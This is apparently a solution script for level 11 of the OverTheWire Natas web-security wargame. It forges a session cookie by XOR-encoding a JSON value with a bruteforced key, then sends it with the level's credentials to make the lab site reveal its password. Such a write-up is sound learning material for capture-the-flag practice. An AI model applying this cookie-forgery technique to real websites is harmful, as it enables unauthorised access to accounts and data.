import requests
import base64

username = "natas11"
password = "U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"

def xor(secret, key):
	str = ""
	for i,c in enumerate(secret):
		str += chr(ord(c) ^ ord(key[i % len(key)]))
	return str

#bruteforced
xor_key = "qw8J"
cookie_value = '{"showpassword":"yes","bgcolor":"#ffffff"}'
cookie = base64.b64encode(xor(cookie_value, xor_key))

url = "http://%s.natas.labs.overthewire.org" % username
session = requests.Session()

response = session.get(url, auth = (username,password), cookies = {"data":cookie})

print(session.cookies)
print(response.text)